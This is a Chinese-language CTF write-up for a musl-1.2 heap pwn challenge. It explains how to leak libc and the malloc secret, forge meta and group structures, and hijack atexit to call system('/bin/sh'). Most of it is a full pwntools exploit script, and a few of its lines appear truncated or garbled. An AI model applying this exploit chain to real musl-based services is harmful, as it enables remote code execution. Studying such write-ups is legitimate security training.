  * 但是溢出的4B是一个前面数据随机+-*的结果, 怎么控制? 可以把前面所有数据都设置为0, 这样运算结果始终为0, 最后一个设为X, 那么就有1/3的概率, 结果为X
###  泄露地址
  * 在设置Record时, 读入name并没有设置00截断, 并且是通过Realloc得到的内存, 并没有初始化, 因此可以先在chunk中写满数据, 防止被截断, 然后设置Record时申请到这个chunk, 就可以读到后面的指针
  * 由于musl的静态内存特性, 当申请某些size时, Grade就是libc指针, 因此可以直接得到libc地址, 测试发现name长度为0x10时, 后面的指针就是libc指针
  * 因此Record在realloc()时的size为0x30
  * 下面考虑怎么复用到这个0x30的chunk
  * 假设有metaA, 现在从里面切割出去了0x30的chunk, 写入数据后释放
  * 首先free会发现, mask | self == all, 也就是说这个chunk的释放, 整个meta的chunk就都被回收了, 因此会调用nontrivial_free()
  * nontrivial_free()中则会把整个meta归还过去
  * 因此一切又回到了一开始的状态, 那么当下次再次分配时, 就又会申请到这个chunk
###  泄露secret
  * 由于meta所在页与group所在页分离, 想要伪造meta, 就必须要泄露secret
  * 再gloden里面还有一个洞, 读入idx时没有检查范围, 也就是说我们可以把与chunk偏移任意地址的数据写入GAME_Res中
  * 由于静态内存分配, 实际测试可以发现: 
    * meta与chunk实际是ELF中无用的页, 因此与meta与ptr偏移一致, 可以就说可以把secret写入GAME_Res中
    * GAME_Res是mmap申请的一页, 把secret写入开头后, 直接再GAME_Res中进行secret的伪造
  * 两次金手指刚好可以写入secret, 后续每局两次的银手指刚好可以用于调过前面的secret
###  触发dequeue
  * 唯一的一次Modify用来溢出后一个chunk的元数据, 伪造idx与size
  * 由于目前只直到libc中的地址, 而伪造meta时有一个检查: meta->mem == group, 因此只能在libc的chunk中伪造group
  * 先伪造chunk_14的offset指向chunk_13, 从而把chunk_13当做group, 计算公式: group = (p – 0x10*offset – 0x10)
  * 然后再group中的伪造meta指针, 这里meta是在Result_Buf中伪造的, 其地址固定
  * 并假装chunk_14是这个group中最后一个chunk, 这需要伪造meta的配合
  * 最后free(chunk_14)就可以触发
###  伪造meta
  * prev/ next的顺序也有讲究, 因为是双向的 
    * 如果Prev=head-0x8, Next = chunk_15, 
      * Prev->Next = Next => *head =chunk_15
      * Next->Prev = Prev => *chunk_15=head, 这会覆盖struct fl的next字段, 导致无法伪造atexit()链表
    * 如果Prev = chunk_15, Next = head 
      * Prev->Next = Next => *(chunk_15+0x8)=head , 不会干扰next字段
      * Next->Prev = Prev => *head = chunk_15,
  * 然后是伪造mem指向伪造的group, 这里也是只能把libc中chunk伪造成group的原因
  * 对于avail_mask freed_mask的伪造要求则是: avail_mask | freed_mask |(1next开始遍历f[]的, 因此还需要伪造一个next指针
## EXP
    #! /usr/bin/python
    # coding=utf-8
    import sys
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    elf = ELF("./pwn")
    libc = ELF('libc.so')
    if(len(sys.argv)==1):            #local
        cmd = ["./pwn"]
        sh = process(cmd)
    else:                        #remtoe
        sh = remote(host, port)
    Arr = [
            [81, 87, 66, 95, 67, 114, 51, 52, 116, 51, 0, 0, 0, 0, 0, 0],
            [81, 87, 66, 95, 68, 51, 108, 51, 84, 101, 0, 0, 0, 0, 0, 0],
            [81, 87, 66, 95, 67, 104, 51, 67, 107, 0, 0, 0, 0, 0, 0, 0],
            [81, 87, 66, 95, 77, 48, 100, 49, 70, 121, 0, 0, 0, 0, 0, 0],
            [81, 87, 66, 95, 71, 48, 48, 100, 66, 121, 101, 0, 0, 0, 0, 0]
        ]
    def Str(Arr):
        res = ''
        for c in Arr:
            res+=chr(c)
        return res
    def Num(n):
        sh.sendline(str(n))
    def Cmd(c):
        sh.recvuntil('>> ')
        Num(c)
    def Prepare():
        Cmd(1)
        sh.recvuntil('Code: ')
        sh.sendline("W31C0M3_to_QWB21")
    def Create(arr):
        sh.recvuntil('$ ')
        sh.send(Str(Arr[0]))
        sh.recvuntil('How many numbers do you need?\n')
        Num(len(arr))
        for N in arr:
            sh.recvuntil(': ')
            Num(N)
    def Delete(idx):
        sh.recvuntil('$ ')
        sh.send(Str(Arr[1]))
        sh.recvuntil('Which challenge do you want to delete?\n')
        Num(idx)
    def Check(idx):
        sh.recvuntil('$ ')
        sh.send(Str(Arr[2]))
        sh.recvuntil('Which challenge do you want to check?\n')
        Num(idx)
    def Modify(idx, arr):
        sh.recvuntil('$ ')
        sh.send(Str(Arr[3]))
        sh.recvuntil('Which challenge do you want to modify?\n')
        Num(idx)
        for N in arr:
            sh.recvuntil(': ')
            Num(N)
    def Bye():
        sh.recvuntil('$ ')
        sh.send(Str(Arr[4]))
    def Challenge(arr, name=''):
        Cmd(2)
        i = 0
        while i next
    exp = [addr&0xFFFFFFFF, (addr>>32)]
    exp+= [0, 0]
    addr = libc.symbols['system']            #f[31]
    exp+= [addr&0xFFFFFFFF, (addr>>32)]
    exp+= [0x15]*4
    Create(exp)                #15
    Create([0x16]*10)        #16
    Create([0x17]*10)        #17
    Create([0x18]*10)        #18
    Create([0x19]*10)        #19
    for i in range(5, 10):
        Delete(i)
    addr = libc.search('/bin/sh\x00').next()    #a[31]
    Create([0x5]*8+[addr&0xFFFFFFFF, (addr>>32)])        #5
    Create([0x6]*10)        #6
    Create([0x7]*10)        #7
    Create([0x8]*10)        #8
    Create([0x9]*10)        #9
    #forge group
    addr = 0x00000deadbeef010
    exp = [addr&0xFFFFFFFF, (addr>>32)]
    #forge idx, offset
    idx = 0x0
    offset = 0x2
    exp+= [0]*(10-2)
    exp+= [(offset<<16)+(idx<<8)]
    Modify(13, exp)
    #trigger dequeue
    Delete(14)
    #GDB()
    #atexit
    Bye()
    Exit()
    sh.interactive()
    '''
    NumBufArr            telescope (0x0000555555554000+0x204360) 20
    Create():calloc()    break *(0x0000555555554000+0x191b)
    RecordPtr            telescope 0x0000555555554000+0x204348
    '''
## 总结
  * musl-1.2的利用只能通过伪造meta, 因此就要绕过meta的检查 
    * 要么直接覆盖__malloc_context中的secret
    * 要么泄露secret
    * 要么在可控的页头处写入secret, 然后在此页上伪造meta
    * 总之, secret是关键, secret在哪一页, 就在哪一页伪造meta